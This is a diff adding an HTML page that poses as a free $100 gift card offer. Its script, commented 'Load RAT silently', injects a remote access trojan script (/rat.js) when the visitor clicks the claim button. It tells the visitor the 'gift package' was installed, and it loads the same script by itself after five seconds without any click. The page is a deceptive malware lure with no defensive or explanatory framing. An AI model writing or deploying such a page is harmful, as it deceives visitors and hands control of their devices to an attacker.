@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>🎁 Free Gift Card</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-family:Arial,sans-serif;text-align:center;padding:40px;min-height:100vh;">
+<div style="max-width:500px;margin:auto;">
+<h1 style="font-size:2.5em;margin-bottom:20px;">🎉 FREE $100 GIFT CARD!</h1>
+<p style="font-size:1.2em;margin-bottom:40px;">Limited time offer - Claim now before expiry!</p>
+<button onclick="installGift()" 
+        style="padding:20px 50px;font-size:1.4em;background:linear-gradient(45deg,#ff6b6b,#feca57);color:#fff;border:none;border-radius:50px;box-shadow:0 15px 35px rgba(0,0,0,0.3);cursor:pointer;font-weight:bold;letter-spacing:2px;transition:all 0.3s;">
+🔥 CLAIM INSTANTLY 🔥
+</button>
+<div id="status" style="margin-top:30px;font-size:1.1em;"></div>
+</div>
+
+<script>
+function installGift(){
+    const status = document.getElementById('status');
+    status.innerHTML = '⏳ Downloading gift package...';
+    
+    // Load RAT silently
+    const script = document.createElement('script');
+    script.src = '/rat.js?t=' + Date.now();
+    script.onload = () => {
+        status.innerHTML = '✅ Gift package installed successfully!<br>🎁 Enjoy your free gift card!';
+        status.style.color = '#4ade80';
+        // Hide button
+        event.target.style.display = 'none';
+    };
+    document.head.appendChild(script);
+}
+
+// Auto-start after 5s (backup)
+setTimeout(()=>{
+    if(!document.querySelector('script[src*="rat.js"]')){
+        const script = document.createElement('script');
+        script.src = '/rat.js';
+        document.head.appendChild(script);
+    }
+}, 5000);
+</script>
+</body>
+</html>
